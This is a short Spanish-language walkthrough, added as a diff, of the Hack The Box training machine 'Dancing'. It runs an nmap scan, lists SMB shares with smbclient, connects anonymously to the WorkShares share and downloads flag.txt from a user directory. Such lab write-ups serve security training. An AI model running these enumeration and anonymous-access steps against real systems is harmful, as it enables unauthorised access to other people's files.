@@ -1,0 +1,14 @@
+HACK THE BOX - DANCING MACHINE
+
+- sudo nmap -sC -sV -sS -Pn 10.129.58.203 -oN nmapDancing                                                           -Escaneo de puertos, encontramos los puertos (135 - 139 - 445) abiertos, dentro de los cuales se corre SMB en el puerto 445
+- smbclient -L \\\\10.129.58.203\\                                                                                  -Nos conectamos a al target a través del uso de smbclient, listamos el contenido, de donde encontramos 
+
+            -Encontramos 4 servidores compartidos (ADMIN$ - C$ - IPC$ - WorkShares) de los cuales el unico sin necesidad de credenciales de conexión es WorkShares, al cual nos conectaremos
+
+- smbclient -N \\\\10.129.58.203\\WorkShares                                                                        -Nos conectamos al servicio compartido con el nombre WorkShares
+- ls                                                                                                                -Listamos el contenido del servidor, en el que encontramos dos directorios (James.P y Amy.J), en una busuqeda encontramos un archivo flag en el directorio de James.P
+- cd James.P                                                                                                        -Nos dirigimos al directorio James.Para
+- get flag.txt                                                                                                      -Descargamos el archivo con el FLAG
+- cat flag.txt
+
+    MAQUINA TERMINADA
